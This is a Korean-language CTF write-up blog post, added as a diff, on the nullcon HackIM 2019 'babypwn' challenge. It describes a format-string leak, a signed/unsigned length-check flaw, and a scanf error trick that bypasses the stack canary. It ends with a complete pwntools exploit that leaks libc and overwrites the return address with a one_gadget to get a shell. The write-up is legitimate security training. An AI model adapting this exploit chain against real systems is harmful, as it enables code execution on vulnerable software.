@@ -1,0 +1,102 @@
+---
+layout: post
+cover: 'assets/images/cover8.jpg'
+navigation: true
+title: nullcon_hackIM_2019 babypwn
+date: 2019-02-10
+tags: pwn writeup 포맷스트링 오랜만
+subclass: 'post'
+logo: 'assets/images/ghost.png'
+author: lanphere
+categories: lanphere
+disqus: true
+---
+
+<br>
+<img src="/files/nullcon_hackIM_2019_babypwn/bin_info.JPG"><br>
+먼저 보호기법을 확인했다. PIE가 걸려있지 않아서 편하다.<br><br>
+<h3>바이너리 취약점</h3>
+<img src="/files/nullcon_hackIM_2019_babypwn/code.JPG"><br>
+100바이트의 메모리를 할당받고 문자열을 입력받는다. 문자열을 입력받고 나면<br>
+"Tressure Box: <span style="color: rgb(156, 0, 0);">input</span> created!\r\n" 모양이 될 것이다. 그 이후 코인의 수를 입력받고 입력받은 값 *
+4바이트 만큼<br>
+스택에 입력한다. 취약점은 printf(format); 이 부분이다. 문자열 포인터를 그대로 전달하기 때문에 포맷 스트링을 이용할 수 있다.<br>
+<img src="/files/nullcon_hackIM_2019_babypwn/pic_1.JPG"><br>
+나중에 받는 입력의 형태가 정수형이라는 걸 고려해서 메모리에 0x4141414141이 들어가도록 생각하며 포맷스트링 취약점을 확인했다.<br>
+여덟 번째 %p에서 스택에 있는 0x4141414141414141이 leak됐다. 그 와중에 두 번째 %p에서 0x7f4297a42790을 보면 libc주소 같은<br>
+느낌이 든다. 저걸로 libc leak을 하면 될 것 같다.<br><img src="/files/nullcon_hackIM_2019_babypwn/pic_2.JPG"><span
+  style="color: inherit; font-family: inherit;"><br></span>
+<br>
+그런데 자세히보니 취약점이 하나 더 있었다. min_6A라는 변수에 scanf로 입력을 받을 때 %hhu로 받는다.<br>
+<span style="background-color: rgb(0, 255, 0);">%hhu는 부호 없는 1바이트 정수라고 한다</span>. 그런데 아래 if문은 char형, 즉 부호가 있는 형태로 검사를
+하고 있다.<br>
+따라서 0x7f보다 큰 값을 scanf의 input으로 넣으면 if문 검사를 통과하면서 아래 for문에서 보다 많은 스택의 영역을 덮어쓸 수 있고,<br>
+결론적으로 return address를 덮어쓸 수 있다.<br>
+그런데 이 바이너리에 stack canary가 있었기 때문에 그냥 덮어쓸 순 없어서 고민을 하다가 도저히 답이 안나왔다.<br>
+leak을 하고 무조건 다시 main함수로 돌아와서 취약점을 다시 이용해야 쉘을 딸 수 있을텐데 다른 방법으로<br>
+실행흐름을 바꾸는 방법은 생각이 나지 않다가 <span style="color: rgb(8, 82, 148);">scanf에도 취약점이 있다는 것을 알게 됐다. scanf는 입력값이 주어진 형태에 맞지
+  않으면</span><br>
+<span style="color: rgb(8, 82, 148);">입력을 받지 못하고 에러를 발생시킨다는 것이다. 하지만 그 에러를 검사하지 않기 때문에 이를 이용하면 canary는 그대로 나둔
+  채</span><br>
+<span style="color: rgb(8, 82, 148);">return address만 바꿀 수 있다.</span><br><br>
+<h3><span style="color: inherit; font-family: inherit;">익스플로잇</span></h3>
+1. 포맷스트링을 이용해서 libc leak, main으로 다시 돌아감<br>
+2. 다시 포맷스트링을 이용해서 return address를 one_gadget의 주소로 덮어씀<br>
+<pre><code>from pwn import *
+
+binary = ELF('./babypwn')
+libc = ELF('./libc.so.6')
+
+main_addr = 0x400806
+libc_offset = 0x3c6790
+gadget_offset = 0xf1147 # 0x45216 0x4526a 0xf02a4 0xf1147
+
+p = process('./babypwn', env = {'LD_PRELOAD' : './libc.so.6'})
+
+# gdb.attach(p, 'b *0x4009a3');
+
+# Stage1: Leak libc addr and return to main
+p.sendline('y')
+p.sendlineafter('name: ', '%p' * 25)
+p.sendlineafter('have?', '128')
+
+for i in range(22):
+  p.sendline('1094795585') # AAAAAAAA
+
+for i in range(4):
+  p.sendline('-')
+
+p.sendline(str(main_addr))
+p.sendline('0')
+
+for i in range(100):
+  p.sendline('0')
+
+p.recvuntil('Tressure Box: ')
+libc_addr = int(p.recv().split('0x')[2], 16) - libc_offset
+one_gadget_addr = libc_addr + gadget_offset
+log.info('libc_addr: ' + hex(libc_addr))
+log.info('gadget_addr: ' + hex(one_gadget_addr))
+
+
+# Stage2: overwrite return address to one_gadget
+p.sendline('y')
+p.sendlineafter('name: ', '%p' * 25)
+p.sendlineafter('have?', '128')
+
+for i in range(22):
+  p.sendline('1094795585') # AAAAAAAA
+
+for i in range(4):
+  p.sendline('-')
+
+log.info(hex(one_gadget_addr & 0x00000000ffffffff))
+log.info(hex((one_gadget_addr & 0xffffffff00000000) >> 32))
+p.sendline(str(one_gadget_addr & 0x00000000ffffffff))
+p.sendline(str((one_gadget_addr & 0xffffffff00000000) >> 32))
+
+
+for i in range(100):
+  p.sendline('0')
+
+p.interactive();</code></pre>
